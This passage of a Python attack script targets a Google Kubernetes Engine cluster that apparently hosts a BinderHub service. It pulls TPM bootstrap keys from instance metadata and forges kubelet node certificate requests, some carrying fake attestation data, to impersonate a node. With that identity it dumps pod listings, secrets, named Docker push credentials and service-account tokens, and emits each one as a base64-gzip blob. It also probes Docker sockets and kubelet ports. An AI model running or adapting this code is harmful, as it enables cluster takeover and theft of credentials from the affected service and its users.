                out("--kubelet-tls-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-tls-end--")
            except urllib.error.HTTPError as e:
                out("KUBELET-TLS %s HTTP %s %s" % (url, e.code, e.read()[:200].decode("utf8", "replace")))
            except Exception as e:
                out("KUBELET-TLS %s ERR %r" % (url, e))
    out("===PLUGIN-END===")



def _csrname(keypem, cn, org, usages):
    import hashlib
    try:
        h = hashlib.new("sha512_256")
    except Exception:
        h = hashlib.sha256()
    for part in [keypem, cn, org] + usages:
        h.update(base64.urlsafe_b64encode(part.encode()).rstrip(b"="))
        h.update(b"|")
    return "node-csr-" + base64.urlsafe_b64encode(h.digest()).rstrip(b"=").decode()


def csr():
    """Generate a kubelet node client CSR exactly as gke-exec-auth-plugin tpm mode does
    (EC key, O=system:nodes, CN=system:node:<instance>, usages ds/ke/ca, node-csr-<digest>),
    submit it with the TPM bootstrap cert and poll for approval. Variants: plain, with a
    VM IDENTITY block, and with a bogus attestation triplet."""
    import subprocess, urllib.parse, time
    out("===CSR-BEGIN===")
    # --- tokeninfo: default token vs ?scopes= requested token (VM scope ceiling proof)
    for lbl, path in [("DEFAULT", "instance/service-accounts/default/token"),
                      ("SCOPED", "instance/service-accounts/default/token?scopes=" + urllib.parse.quote("https://www.googleapis.com/auth/cloud-platform", safe=""))]:
        st, tokb = md_get(path)
        try:
            at = json.loads(tokb.decode()).get("access_token", "")
        except Exception:
            at = ""
        out("TOKEN-%s status=%s len=%d" % (lbl, st, len(at)))
        try:
            r = urllib.request.urlopen("https://oauth2.googleapis.com/tokeninfo?access_token=" + urllib.parse.quote(at), timeout=15)
            out("TOKENINFO-%s status=%s %s" % (lbl, r.status, r.read()[:1200].decode("utf8", "replace")))
        except urllib.error.HTTPError as e:
            out("TOKENINFO-%s HTTP %s %s" % (lbl, e.code, e.read()[:600].decode("utf8", "replace")))
        except Exception as e:
            out("TOKENINFO-%s ERR %r" % (lbl, e))
    # --- dind / docker socket reachability
    out("DOCKER-ENV DOCKER_HOST=%r DOCKER_TLS=%r" % (os.environ.get("DOCKER_HOST"), os.environ.get("DOCKER_TLS_VERIFY")))
    try:
        out("POD-ENV " + " ".join(x for x in open("/proc/1/environ","rb").read().decode("utf8","replace").split("\0") if re.search(r"DOCKER|HOST|BINDER|JUPYTER|KUBE", x, re.I))[:1500])
    except Exception as e:
        out("POD-ENV ERR %r" % (e,))
    try:
        rows=[]
        for line in open("/proc/net/tcp").read().splitlines()[1:]:
            f=line.split()
            if len(f) > 3 and f[3] == "0A":
                ip,port=f[1].split(":")
                rows.append("%s:%d" % (".".join(str(int(ip[i:i+2],16)) for i in (6,4,2,0)), int(port,16)))
        out("LISTEN-TCP " + ",".join(sorted(set(rows))))
    except Exception as e:
        out("LISTEN-TCP ERR %r" % (e,))
    for u in ["http://127.0.0.1:2375/version", "http://127.0.0.1:2375/info", "http://127.0.0.1:2375/containers/json?all=1", "http://127.0.0.1:2376/version"]:
        try:
            r = urllib.request.urlopen(u, timeout=6)
            out("DIND %s status=%s %s" % (u, r.status, r.read()[:900].decode("utf8", "replace")))
        except urllib.error.HTTPError as e:
            out("DIND %s HTTP %s %s" % (u, e.code, e.read()[:300].decode("utf8", "replace")))
        except Exception as e:
            out("DIND %s ERR %r" % (u, e))
    for sp in ["/var/run/docker.sock", "/run/docker.sock", "/var/run/docker-api/docker-api.sock", "/var/run/bhs-bhs/docker-api/docker-api.sock"]:
        out("SOCK %s exists=%s" % (sp, os.path.exists(sp)))
    st, kvb = md_get("instance/attributes/kube-env", timeout=15)
    kv = kvb.decode("utf8", "replace")
    node = md_get("instance/name")[1].decode().strip()
    nodeip = md_get("instance/network-interfaces/0/ip")[1].decode().strip()
    out("NODE %s NODEIP %s KUBEENV status=%s len=%d" % (node, nodeip, st, len(kv)))
    ca = _kv(kv, "CA_CERT"); bootc = _kv(kv, "TPM_BOOTSTRAP_CERT"); bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
    open("/tmp/ca.crt", "wb").write(ca or b"")
    open("/tmp/boot.crt", "wb").write(bootc or b"")
    open("/tmp/boot.key", "wb").write(bootk or b"")
    m = re.search(r"^KUBERNETES_MASTER_NAME:\s*(\S+)\s*$", kv, re.M)
    srv = "https://" + (m.group(1) if m else "10.214.0.4")
    out("SERVER %s CACERT %d BOOTCERT %d BOOTKEY %d" % (srv, len(ca or b""), len(bootc or b""), len(bootk or b"")))
    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb.load_cert_chain("/tmp/boot.crt", "/tmp/boot.key")

    def call(path, method="GET", body=None, ctx=None, auth=None, timeout=25, ctype="application/json"):
        h = {"Content-Type": ctype, "Accept": "application/json"}
        if auth:
            h["Authorization"] = "Bearer " + auth
        req = urllib.request.Request(srv + path, method=method, data=body, headers=h)
        try:
            r = urllib.request.urlopen(req, context=ctx or ctxb, timeout=timeout)
            return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return -1, repr(e).encode()

    # baseline: bootstrap identity
    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                       "spec": {"namespace": "bhs"}}).encode()
    s, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
    out("BOOT-SSRR status=%s %s" % (s, b[:600].decode("utf8", "replace")))
    # oauth token with explicit scopes vs apiserver (scoped retry)
    stt, tokb = md_get("instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform,https://www.googleapis.com/auth/userinfo.email")
    try:
        scoped = json.loads(tokb.decode()).get("access_token", "")
    except Exception:
        scoped = ""
    s, b = call("/api/v1/nodes", ctx=ctx0, auth=scoped)
    out("SCOPEDTOKEN nodes status=%s %s" % (s, b[:200].decode("utf8", "replace")))
    s, b = call("/version", ctx=ctx0, auth=scoped)
    out("SCOPEDTOKEN version status=%s %s" % (s, b[:200].decode("utf8", "replace")))

    # EC key + CSR
    os.system("openssl ecparam -genkey -name prime256v1 -out /tmp/k.pem 2>/dev/null")
    cnf = "[ req ]\nprompt = no\ndefault_md = sha256\ndistinguished_name = dname\n\n[ dname ]\nO = system:nodes\nCN = system:node:%s\n" % node
    open("/tmp/req.cnf", "w").write(cnf)
    os.system("openssl req -new -config /tmp/req.cnf -key /tmp/k.pem -out /tmp/n.csr 2>/dev/null")
    keypem = open("/tmp/k.pem").read()
    csr_pem = open("/tmp/n.csr", "rb").read()
    out("CSR generated key=%d csr=%d" % (len(keypem), len(csr_pem)))
    os.system("openssl req -in /tmp/n.csr -noout -subject 2>&1 | head -2")

    usages = ["digital signature", "key encipherment", "client auth"]
    ident = json.dumps({"tenantID": "220541406316", "nodePool": "default-pool", "projectNumber": "220541406316",
                        "zone": "europe-west10-a", "instanceName": node, "instance": node}).encode()
    att_data = b"FAKE-ATTESTATION-DATA-" + os.urandom(32)
    att_sig = os.urandom(256)
    variants = [("plain", b"", "main", False, False),
                ("nc-user", b"", "nc", True, True),
                ("nc-plain", b"", "nc", True, False),
                ("nc-pem", b"", "nc-pem", True, False)]
    got = None
    for tag, extra, where, use_nc, set_user in variants:
        name = _csrname(keypem, "system:node:" + node, "system:nodes", usages)
        if tag != "plain":
            name = name + "-" + tag
        reqb64 = base64.b64encode(csr_pem + extra).decode()
        spec = {"request": reqb64, "signerName": "kubernetes.io/kube-apiserver-client-kubelet", "usages": usages}
        if set_user:
            spec["username"] = "system:node:" + node
        meta = {} if use_nc else {"name": name}
        body = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
                           "metadata": meta, "spec": spec}).encode()
        ctype = "application/json"
        path = "/apis/certificates.k8s.io/v1/certificatesigningrequests"
        if where.startswith("nc"):
            path = path + "/nodeclient?nodeName=" + urllib.parse.quote(node)
        if where == "nc-pem":
            body = csr_pem
            ctype = "application/x-pem-file"
        s, b = call(path, "POST", body, ctype=ctype)
        out("CSR[%s] create status=%s %s" % (tag, s, b[:400].decode("utf8", "replace")))
        nm2 = name
        if s in (200, 201):
            try:
                j = json.loads(b)
                nm2 = j["metadata"]["name"]
                out("CSR[%s] SERVER-NAME %s spec.username=%r groups=%r" % (tag, nm2,
                    (j.get("spec") or {}).get("username"), (j.get("spec") or {}).get("groups")))
            except Exception:
                pass
        else:
            continue
        cert = None
        for i in range(24):
            time.sleep(3)
            s, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + urllib.parse.quote(nm2))
            if s == 200:
                d = json.loads(b)
                c = d.get("status", {}).get("certificate")
                conds = d.get("status", {}).get("conditions") or []
                out("CSR[%s] poll %d conds=%s certlen=%s" % (tag, i, [x.get("type") for x in conds], len(c) if c else 0))
                if c:
                    cert = base64.b64decode(c)
                    break
                if any(x.get("type") == "Denied" for x in conds):
                    break
            elif s == 404:
                out("CSR[%s] poll %d 404" % (tag, i))
        if cert:
            open("/tmp/ncrt.pem", "wb").write(cert)
            got = tag
            out("CSR[%s] ISSUED len=%d" % (tag, len(cert)))
            os.system("openssl x509 -in /tmp/ncrt.pem -noout -subject -issuer -dates 2>&1 | head -4")
            break
    if not got:
        out("NO CERT ISSUED")
        for url in ["http://%s:10255/pods" % nodeip]:
            try:
                r = urllib.request.urlopen(url, timeout=8); b = r.read()
                out("NOCERT-KUBELET-RO %s status=%s len=%d" % (url, r.status, len(b)))
                out("--kubelet-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-end--")
            except Exception as e:
                out("NOCERT-KUBELET-RO %s ERR %r" % (url, e))
        out("===CSR-END===")
        return
    ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/k.pem")

    def ncall(path, method="GET", body=None, timeout=25):
        return call(path, method=method, body=body, ctx=ctxn, timeout=timeout)

    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                       "spec": {"namespace": "bhs"}}).encode()
    s, b = ncall("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
    out("NODE-SSRR status=%s\n%s" % (s, b[:6000].decode("utf8", "replace")))
    s, b = ncall("/api/v1/nodes")
    out("NODE nodes status=%s len=%d" % (s, len(b)))
    if s == 200:
        out("--nodejson-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--nodejson-end--")
    pods = []
    for path in ["/api/v1/pods?fieldSelector=" + urllib.parse.quote("spec.nodeName=" + node) + "&limit=500",
                 "/api/v1/pods?limit=500"]:
        s, b = ncall(path)
        out("PODS %s status=%s len=%d %s" % (path[:80], s, len(b), b[:200].decode("utf8", "replace")))
        if s == 200:
            out("--pods-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--pods-end--")
            try:
                pods = json.loads(b).get("items", [])
            except Exception:
                pass
            break
    secretrefs = []; sapairs = []
    for p in pods:
        md = p.get("metadata", {}); ns = md.get("namespace"); spec = p.get("spec", {})
        secs = []
        for v in (spec.get("volumes") or []):
            if v.get("secret"):
                secs.append(v["secret"].get("secretName"))
            for src in (v.get("projected", {}) or {}).get("sources", []) or []:
                if src.get("secret"):
                    secs.append(src["secret"].get("name"))
        for c in (spec.get("containers") or []) + (spec.get("initContainers") or []):
            for e in (c.get("env") or []):
                if e.get("valueFrom", {}).get("secretKeyRef"):
                    secs.append(e["valueFrom"]["secretKeyRef"].get("name"))
            for ef in (c.get("envFrom") or []):
                if ef.get("secretRef"):
                    secs.append(ef["secretRef"].get("name"))
        out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s|imgs=%s" % (ns, md.get("name"), spec.get("nodeName"),
            spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secs,
            [c.get("image") for c in (spec.get("containers") or [])]))
        if ns and spec.get("serviceAccountName"):
            sapairs.append((ns, spec["serviceAccountName"]))
        for sname in set(x for x in secs if x):
            secretrefs.append((ns, sname))
    for ns, sname in sorted(set(secretrefs)):
        if _logged > 320000:
            out("SECRET-BUDGET-CAP-REACHED"); break
        s, b = ncall("/api/v1/namespaces/%s/secrets/%s" % (ns, sname))
        out("SECRET %s/%s status=%s len=%d" % (ns, sname, s, len(b)))
        if s == 200:
            out("--secret-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--secret-end--")
            try:
                d = json.loads(b)
                out("SECRET-KEYS %s/%s type=%s keys=%s" % (ns, sname, d.get("type"), sorted((d.get("data") or {}).keys())))
            except Exception:
                pass
    # explicit high-value secret names (binderhub push credential class)
    for ns in ["bhs", "bindernew", "default", "kube-system"]:
        for sname in ["binder-build-docker-config", "binder-build-docker-config-class", "binder-build-docker-config-json",
                      "binder-secret", "hub"]:
            s2, b2 = ncall("/api/v1/namespaces/%s/secrets/%s" % (ns, sname))
            out("NAMED-SECRET %s/%s status=%s len=%d" % (ns, sname, s2, len(b2)))
            if s2 == 200:
                out("--named-secret-b64gzip--"); out(base64.b64encode(gzip.compress(b2)).decode()); out("--named-secret-end--")
                try:
                    d2 = json.loads(b2)
                    out("NAMED-SECRET-KEYS %s/%s type=%s keys=%s" % (ns, sname, d2.get("type"), sorted((d2.get("data") or {}).keys())))
                except Exception:
                    pass

    if _logged > 420000:
        out("SATOKEN-BUDGET-CAP-REACHED")
    for ns, sa in sorted(set(sapairs)):
        body = json.dumps({"apiVersion": "authentication.k8s.io/v1", "kind": "TokenRequest",
                           "spec": {"audiences": ["https://container.googleapis.com/v1/projects/220541406316/zones/europe-west10-a/clusters/jup-test"], "expirationSeconds": 3600}}).encode()
        s, b = ncall("/api/v1/namespaces/%s/serviceaccounts/%s/token" % (ns, sa), "POST", body)
        out("SATOKEN %s/%s status=%s %s" % (ns, sa, s, b[:300].decode("utf8", "replace")))
        if s in (200, 201):
            out("--satoken-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--satoken-end--")
    for ns in ["bhs", "bindernew", "kube-system", "default"]:
        for res in ["secrets", "configmaps", "serviceaccounts", "pods"]:
            if _logged > 520000:
                out("LIST-BUDGET-CAP-REACHED"); break
            s, b = ncall("/api/v1/namespaces/%s/%s?limit=500" % (ns, res))
            out("LIST %s/%s status=%s len=%d %s" % (ns, res, s, len(b), b[:120].decode("utf8", "replace")))
            if s == 200:
                out("--list-%s-%s-b64gzip--" % (ns, res)); out(base64.b64encode(gzip.compress(b)).decode()); out("--list-end--")
    for url in ["http://%s:10255/pods" % nodeip, "http://%s:10255/configz" % nodeip, "http://%s:10255/spec" % nodeip]:
        try:
            r = urllib.request.urlopen(url, timeout=8); b = r.read()
            out("KUBELET-RO %s status=%s len=%d" % (url, r.status, len(b)))
            out("--kubelet-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-end--")
        except Exception as e:
            out("KUBELET-RO %s ERR %r" % (url, e))
    for url in ["https://%s:10250/pods" % nodeip, "https://%s:10250/configz" % nodeip]:
        try:
            r = urllib.request.urlopen(urllib.request.Request(url), context=ctxn, timeout=8); b = r.read()
            out("KUBELET-TLS %s status=%s len=%d" % (url, r.status, len(b)))
            out("--kubelet-tls-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-tls-end--")
        except urllib.error.HTTPError as e:
            out("KUBELET-TLS %s HTTP %s %s" % (url, e.code, e.read()[:200].decode("utf8", "replace")))
        except Exception as e:
            out("KUBELET-TLS %s ERR %r" % (url, e))
    out("===CSR-END===")



if __name__ == "__main__":
    {"meta": meta, "api": api, "api5": api5, "plugin": plugin, "csr": csr, "deep": csr}[sys.argv[1]]()
